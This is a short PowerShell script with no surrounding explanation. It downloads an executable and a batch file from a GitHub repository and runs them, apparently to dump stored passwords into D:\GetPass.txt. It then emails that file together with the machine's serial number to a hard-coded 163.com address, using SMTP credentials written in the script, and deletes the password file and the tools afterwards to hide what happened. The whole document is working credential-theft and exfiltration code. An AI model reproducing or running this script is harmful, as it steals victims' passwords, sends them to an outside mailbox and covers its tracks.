(new-object System.Net.WebClient).DownloadFile('https://github.com/fiz7/chm/blob/master/GetPass.rar','D:\Get.exe');
(new-object System.Net.WebClient).DownloadFile('https://github.com/fiz7/chm/blob/master/Command.rar','D:\Command.bat');
D:\Command.bat;
$object1 = 'GetPass.txt--' + (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME).SerialNumber
$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
$mail.From = New-Object System.Net.Mail.MailAddress('ueegiw@163.com','ueegiw@163.com')
$mail.To.Add('ueegiw@163.com')
#set the content
$mail.Subject = $object1
$mail.Priority  = 'High'
$mail.Body = 'test'
$filename= 'D:\GetPass.txt'
$attachment = new-Object System.Net.Mail.Attachment($filename)
$mail.Attachments.Add($attachment)
#send the message
$smtp = New-Object System.Net.Mail.SmtpClient -argumentList 'smtp.163.com'
$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList 'ueegiw@163.com','mueq2426'
$smtp.EnableSsl = 'True';
$smtp.Timeout = '10000000';
try{
	$smtp.Send($mail)
	echo 'Ok,Send succed!'
}
catch 
{
	echo 'Error!Filed!'
}
remove-item 'D:\GetPass.txt'
remove-item 'D:\Get.exe'
remove-item 'D:\Command.bat'
